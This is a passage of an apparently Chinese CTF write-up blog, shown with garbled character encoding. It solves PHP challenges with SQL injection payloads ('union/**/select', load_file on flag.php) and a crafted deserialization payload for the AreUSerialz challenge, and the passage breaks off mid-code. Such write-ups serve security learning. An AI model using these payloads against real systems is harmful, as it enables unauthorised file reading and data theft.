<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">blog</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">isValidBlog</span> <span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$blog</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">blog</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i"</span><span class="token punctuation">,</span> <span class="token variable">$blog</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æœ¬åœ°åºåˆ—åŒ–ï¼š</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">UserInfo</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string">"test"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$age</span> <span class="token operator">=</span> <span class="token number">123</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$blog</span> <span class="token operator">=</span> "file<span class="token punctuation">:</span><span class="token comment" spellcheck="true">///var/www/html/flag.php";#è®¿é—®è¯·æ±‚ä¸€ä¸‹åˆ¤æ–­æ˜¯å¦å­˜åœ¨</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">UserInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¾—åˆ°ï¼šO:8:â€UserInfoâ€:3:{s:4:â€nameâ€;s:4:â€testâ€;s:3:â€ageâ€;i:123;s:4:â€blogâ€;s:22:â€file:///var/www/html/flag.phpâ€;}</p><p>åˆ©ç”¨æ³¨å…¥å°†æ•°æ®ä¼ å…¥è¿›å»ï¼š</p><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>no<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> union<span class="token comment" spellcheck="true">/**/</span>select <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span>'O<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span>"UserInfo"<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span>"name"<span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span>"test"<span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span>"age"<span class="token punctuation">;</span>i<span class="token punctuation">:</span><span class="token number">123</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span>"blog"<span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">29</span><span class="token punctuation">:</span>"file<span class="token punctuation">:</span><span class="token comment" spellcheck="true">///var/www/html/flag.php";}'#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>f12å¯ä»¥ä¹‹é—´çœ‹è§ï¼Œå³é”®æºä»£ç åˆ™éœ€è¦base64å†è§£å¯†</p><p>è§£æ³•äºŒï¼šåˆ©ç”¨æ²¡è¢«è¿‡æ»¤çš„å‡½æ•°load_file()</p><p>payload:</p><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>no<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> union<span class="token comment" spellcheck="true">/**/</span>select <span class="token number">1</span><span class="token punctuation">,</span><span class="token function">load_file</span><span class="token punctuation">(</span><span class="token string">'/var/www/html/flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="2021-4-25"><a href="#2021-4-25" class="headerlink" title="2021-4-25"></a>2021-4-25</h1><h2 id="ç½‘é¼æ¯-2020-é’é¾™ç»„-AreUSerialz"><a href="#ç½‘é¼æ¯-2020-é’é¾™ç»„-AreUSerialz" class="headerlink" title="[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz"></a>[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz</h2><p>å…ˆæ‰«ç›²ï¼š</p><p><a href="https://www.w3school.com.cn/php/func_string_ord.asp" target="_blank" rel="noopener">PHP ord() å‡½æ•°</a>å…¶è¿”å›å€¼ä¸ºASCIIç </p><p>file_put_contents() å‡½æ•°æŠŠä¸€ä¸ªå­—ç¬¦ä¸²å†™å…¥æ–‡ä»¶ä¸­ï¼Œå¦‚æœæˆåŠŸï¼Œè¯¥å‡½æ•°å°†è¿”å›å†™å…¥æ–‡ä»¶ä¸­çš„å­—ç¬¦æ•°ã€‚å¦‚æœå¤±è´¥ï¼Œåˆ™è¿”å› Falseã€‚</p><p>=== éœ€è¦å€¼å’Œå…¶æ‰€å±çš„ç±»å‹éƒ½ç¬¦åˆè¦æ±‚ â€˜2â€™ === 2 false</p><p>== å€¼ç¬¦åˆè¦æ±‚å³å¯ â€˜2â€™ == 2 true</p><p>é¢˜ç›®ï¼š</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">FileHandler</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$op</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$op</span> <span class="token operator">=</span> <span class="token string">"1"</span><span class="token punctuation">;</span>        <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string">"/tmp/tmpfile"</span><span class="token punctuation">;</span>        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token string">"Hello World!"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">op</span> <span class="token operator">==</span> <span class="token string">"1"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">write</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">op</span> <span class="token operator">==</span> <span class="token string">"2"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string">"Bad Hacker!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">write</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string">"Too long!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string">"Successful!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">else</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string">"Failed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string">"Failed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token variable">$res</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">output</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"[Result]: &lt;br>"</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$s</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">op</span> <span class="token operator">===</span> <span class="token string">"2"</span><span class="token punctuation">)</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">op</span> <span class="token operator">=</span> <span class="token string">"1"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">32</span> <span class="token operator">&amp;&amp;</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">125</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">{</span><span class="token string">'str'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'str'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é¦–å…ˆï¼Œè¿™é‡Œé¢åœ¨ä¼ å…¥ååºåˆ—åŒ–åçš„å‚æ•°ä¼šè¢«è°ƒç”¨åˆ°çš„å‡½æ•°åªæœ‰</p><p>__construct()ï¼šå½“ä¸€ä¸ªå¯¹è±¡åˆ›å»ºæ—¶è¢«è°ƒç”¨</p><p>__destruct()ï¼šå½“ä¸€ä¸ªå¯¹è±¡é”€æ¯æ—¶è¢«è°ƒç”¨</p><h3 id="1-ç»•è¿‡is-valid-å‡½æ•°"><a href="#1-ç»•è¿‡is-valid-å‡½æ•°" class="headerlink" title="1.ç»•è¿‡is_valid()å‡½æ•°"></a>1.ç»•è¿‡is_valid()å‡½æ•°</h3><p>å‡½æ•°is_valid($s)å¯¹ä¼ å…¥çš„å­—ç¬¦ä¸²è¿›è¡Œåˆ¤æ–­ï¼Œç¡®ä¿æ¯ä¸€ä¸ªå­—ç¬¦ASCIIç å€¼éƒ½åœ¨32-125ï¼Œå³è¯¥å‡½æ•°çš„ä½œç”¨æ˜¯ç¡®ä¿å‚æ•°å­—ç¬¦ä¸²çš„æ¯ä¸€ä¸ªå­—ç¬¦éƒ½æ˜¯å¯æ‰“å°çš„ï¼Œæ‰è¿”å›trueï¼Œä¹Ÿå°±æ˜¯è¿™é‡Œï¼š</p><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>ç»•è¿‡æ–¹æ³•ï¼š</p><p>é’ˆå¯¹ä¸protectedç±»å‹å’Œprivateç±»å‹çš„å±æ€§å­˜åœ¨ä¸å¯æ‰“å°å­—ç¬¦ï¼š</p><p>protectåˆ†æï¼š</p><pre><code>æœ¬æ¥æ˜¯sexç»“æœä¸Šé¢å‡ºç°çš„æ˜¯*sexï¼Œè€Œä¸”*sexçš„é•¿åº¦æ˜¯4ï¼Œä½†æ˜¯ä¸Šé¢æ˜¾ç¤ºçš„æ˜¯6ï¼ŒåŒæ ·æŸ¥æ‰¾èµ„æ–™åå‘ç°protectå±æ€§åºåˆ—åŒ–çš„æ—¶å€™æ ¼å¼æ˜¯%00*%00sex(æˆå‘˜å)</code></pre><p>privateåˆ†æï¼š</p><pre><code>è¿™æ ·å°±å‘ç°æœ¬æ¥æ˜¯ageç»“æœä¸Šé¢å‡ºç°çš„æ˜¯testageï¼Œè€Œä¸”testageé•¿åº¦ä¸º7ï¼Œä½†æ˜¯ä¸Šé¢æ˜¾ç¤ºçš„æ˜¯9æŸ¥æ‰¾èµ„æ–™åå‘ç°privateå±æ€§åºåˆ—åŒ–çš„æ—¶å€™æ ¼å¼æ˜¯%00ç±»å%00æˆå‘˜åï¼Œ%00å ä¸€ä¸ªå­—èŠ‚é•¿åº¦ï¼Œæ‰€ä»¥ageåŠ äº†ç±»ååå˜æˆäº†%00test%00ageé•¿åº¦ä¸º9</code></pre><p>é‚£ä¹ˆè¿™é‡Œå¦‚æœä¼ å‡ºï¼Œå¯¹ç…§<a href="http://ascii.911cha.com/" target="_blank" rel="noopener">ASCIIç è¡¨</a>32-125è¢«å®šä¹‰ä¸ºå¯æ˜¾ç¤ºå­—ç¬¦ï¼Œä½†æ˜¯%00ä¸ºè®¤å®šä¸ºåªå ä¸€ä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥ä¸åœ¨32-125çš„é˜Ÿä¼ä¸­ï¼Œæ•…å¿…é¡»ä¿®æ”¹æˆå‘˜å±æ€§ä¸ºpublicï¼Œä½†æ˜¯è¿™é‡Œæœ‰ç»™å‰æå°±æ˜¯ï¼š<strong>PHP7.1ä»¥ä¸Šç‰ˆæœ¬å¯¹å±æ€§ç±»å‹ä¸æ•æ„Ÿ</strong>ï¼Œæ‰€ä»¥æ‰å¯ä»¥å®ç°</p><p>7.1ä»¥ä¸‹çš„ç»•è¿‡å§¿åŠ¿ï¼š</p><p>å½“æˆ‘ä»¬å°†ä¸è®ºæ˜¯å¸¦æœ‰protectedè¿˜æ˜¯privateçš„æˆå‘˜å±æ€§æ—¶ï¼š</p><pre><code>O:11:&quot;FileHandler&quot;:3:{S:5:&quot;\00*\00op&quot;;i:2;S:11:&quot;\00*\00filename&quot;;S:8:&quot;flag.php&quot;;S:10:&quot;\00*\00content&quot;;S:7:&quot;oavinci&quot;;}</code></pre><p>åªè¦å°†ä»£è¡¨å­—ç¬¦ä¸²ä¸ªæ•°çš„çš„sæ”¹ä¸ºå¤§å†™Sï¼Œå°±å¯ä»¥å®ç°å°†%00ç”¨16è¿›åˆ¶ç¼–ç è¡¨ç¤ºï¼Œå˜æˆ00</p><h3 id="2-åˆ©ç”¨-destruct-æ¥å®ç°read-æ–¹æ³•çš„è°ƒç”¨"><a href="#2-åˆ©ç”¨-destruct-æ¥å®ç°read-æ–¹æ³•çš„è°ƒç”¨" class="headerlink" title="2.åˆ©ç”¨__destruct()æ¥å®ç°read()æ–¹æ³•çš„è°ƒç”¨"></a>2.åˆ©ç”¨__destruct()æ¥å®ç°read()æ–¹æ³•çš„è°ƒç”¨</h3><p>é—®é¢˜1ï¼šä¸ºä»€ä¹ˆéè¦è°ƒç”¨read()æ–¹æ³•</p><p>å›ç­”1ï¼šå¯¹æ¯”write()ä¸read()</p><pre class="line-numbers language-php"><code class="language-php"> <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">write</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string">"Too long!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string">"Successful!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">else</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string">"Failed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string">"Failed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é¦–å…ˆéœ€è¦è®¾ç½®æˆå‘˜filenameå’Œcontentï¼Œç„¶ååˆ¤æ–­contentä¸èƒ½çš„å­—ç¬¦ä¸²ä¸èƒ½å¤§äº100ï¼Œç„¶åå†å°†contentçš„å†…å®¹å†™å…¥åˆ°æˆ‘ä¼ å…¥çš„filenameçš„æ–‡ä»¶ä¸­ï¼Œç„¶åé€šè¿‡åˆ¤æ–­resçš„ç±»å‹æ¥æ‰§è¡Œoutputæ–¹æ³•ï¼Œä½†æ˜¯å¦‚æœæŒ‰ç…§è¿™ä¸ªé€»è¾‘çš„è¯ï¼Œé‚£ä¹ˆflagè¿™è¾ˆå­æ˜¯å‡ºä¸æ¥äº†ï¼Œå¾—åˆ°çš„ç»“æœè¦ä¹ˆsuccessfulï¼Œè¦ä¹ˆæ˜¯failedï¼Œæ‰€ä»¥ä¸å¯èƒ½æ˜¯é€šè¿‡writeæ–¹æ³•äº†</p><p>é—®é¢˜2ï¼šé‚£ä¹ˆå¦‚ä½•è°ƒç”¨read()æ–¹æ³•å‘¢ï¼Ÿ</p><p>å›ç­”2ï¼šåˆ©ç”¨å¯ä»¥è°ƒç”¨çš„__destruct()æ¥å®ç°read()æ–¹æ³•çš„è°ƒç”¨</p><pre class="line-numbers language-php"><code class="language-php"> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">op</span> <span class="token operator">===</span> <span class="token string">"2"</span><span class="token punctuation">)</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">op</span> <span class="token operator">=</span> <span class="token string">"1"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>===å¾ˆæ‰çœ¼ï¼Œè€ƒç‚¹ä¸ºå¼±ç±»å‹ï¼Œå¦‚æœop=ä¸€ä¸ªå­—ç¬¦å‹çš„2é‚£ä¹ˆå°±æŠŠ2å˜æˆ1ï¼Œç„¶åè°ƒç”¨process()æ–¹æ³•ï¼š</p><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">op</span> <span class="token operator">==</span> <span class="token string">"1"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">write</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">op</span> <span class="token operator">==</span> <span class="token string">"2"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token 